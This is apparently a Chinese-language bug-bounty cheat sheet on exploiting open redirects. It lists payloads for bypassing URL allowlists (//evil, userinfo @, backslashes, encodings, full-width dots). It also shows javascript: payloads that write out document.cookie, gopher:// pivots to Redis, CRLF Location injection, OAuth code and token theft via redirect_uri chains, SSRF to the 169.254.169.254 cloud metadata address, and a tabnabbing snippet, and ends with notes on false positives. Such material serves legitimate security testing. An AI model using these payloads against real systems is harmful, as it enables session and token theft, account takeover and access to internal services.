## 一、漏洞确认 | 认 redirect 面与 sink

- **认参数**:包里有 `url`/`redirect`/`next`/`dest`/`return`/`returnUrl`/`backUrl`/`go`/`forward`/`target`/`continue`/`link`/`to`/`ref`/`callback`/`path`/`rurl` 一类,值是 URL 或路径 → redirect 面。
- **认 sink**:服务端 301/302 `Location` 头(PHP `header("Location:")`、Python `redirect()`、Java `sendRedirect`、Node `res.redirect`),或前端 JS(`window.location`/`.href`/`.replace`/`window.open`/`document.location`)。**前端 sink 才执行 `javascript:`;HTTP 302 `Location` 写 `javascript:` 浏览器不跑,那只是开放跳转不是 XSS。**
- **认约束**:任意 URL 直跳?还是白名单固定域(白名单 → 走绕过段)。

## 二、绕过思路 | 先推测后端校验逻辑,再按根因对症

- **1. 校验≠解析**(校验层和浏览器/服务端解析出不同 host,核心):
  - **协议相对 `//evil`**:浏览器继承当前协议跳 evil,有的校验当相对路径放行。
  - **userinfo `@`**:`https://trusted@evil` 校验看 trusted、浏览器请求 evil;反向 `//evil\@trusted` 校验串含 trusted、浏览器跳 evil。null byte 截断校验:`trusted%00@evil`。
  - **fragment/query 混淆**:`http://evil?trusted`、`http://evil#trusted`、`http://evil#@trusted`——校验子串含 trusted、浏览器 host 是 evil。
  - **Django `endswith(target)`**:`http://evil/www.target`——path 以 target 结尾过校验、host 是 evil。
  - **反斜杠 `\/`/`\`**:浏览器把 `\` 当 `/` 规范化,校验当路径字符放行 → `/\evil`、`/\/evil`。
  - **大小写/编码**:`HTTP://`、`%6cocalhost`→`localhost`;双重编码 `%252e` 过校验、二次解码成 `.`。
  - **unicode 全角**:`evil。com`(U+3002)/`evil．com`(U+FF0E)有的解析器当点。
- **2. 白名单自带跳转**(校验放行首跳,redirect 导到外站):白名单域上的开放重定向(`trusted/redirect?url=`)或可信跳转服务(`link.trusted/?url=`);自己控的域配 302——域名无害过校验、Location 指 evil。多跳:直拦内网时 `r1→同域 r2→内网`,校验常不复查第二跳。
- **3. 协议层**:
  - **`javascript:`**(前端 sink 才执行):字面被拦时冒号改 `%3A`、关键字拆 `%0d/%0a/%09`(`java%09script:`)+反引号拼(`ev`+`al`/`ale`+`rt`),先 `alert(1)` 探协议通不通,打 SRC 换 `document.write(document.cookie)` 或其 Base64。
  - **`file://`/`gopher://`/`dict://`**(服务端跟跳时):http→gopher 打 Redis、→file 读本地。
- **4. CRLF 注入 redirect**:路径回显进 `Location` 头时,`/%0d%0aLocation: https://evil` 注入第二个 Location 头赢。

## 三、漏洞证明 | 不只跳转,看能盗什么

- **开放跳转(基本)**:`?url=https://evil` 真跳外站。单独开放跳转危害低(SRC 常低评),价值在链。
- **OAuth/Token 盗**:`redirect_uri` 白名单域上有开放跳转时,`/authorize?redirect_uri=https://trusted/redirect?url=https://evil` → 授权码/token 跟 fragment/query 带到 evil。implicit 流 token 在 `#`、code 流 code 在 query、OIDC `id_token` 在 `#`。redirect_uri 校验绕过:`trusted/cb/../redirect?url=evil`、`trusted/cb?next=evil`、`trusted/cb#@evil`、`trusted/cb%2f..%2fredirect`。
- **SSRF via 跟跳**:服务端组件(URL 预览/unfurler/webhook/图片抓取)跟 HTTP 跳转时,`url=https://attacker/r` → attacker 回 `302 → 169.254.169.254`,服务端跟跳到云元数据。
- **CSRF Referer 绕过**:CSRF 防护只校验 Referer 含 trusted 时,`trusted/redirect?url=trusted/change-email` 跳转保 Referer 过闸。
- **Tabnabbing**:外链 `target="_blank"` 无 `rel="noopener"` 时,新页 `window.opener.location = 钓鱼页`,用户回原 tab 输凭证。认:外链 `target=_blank` 无 noopener;打:attacker 页 `if(window.opener) window.opener.location='钓鱼页'`。

## 四、误报场景

- HTTP 302 `Location: javascript:...` 浏览器不执行 = 只是开放跳转,不是 XSS。
- 只改 Location 不真跳(响应链没跟)≠ 跳转成功。
- redirect_uri 校验严(精确匹配/不允路径穿越)≠ OAuth 盗。
- 服务端不跟跨协议跳(多数 HTTP 客户端不跟 http→gopher)≠ SSRF 链成;curl 默认跟,验证时注意。
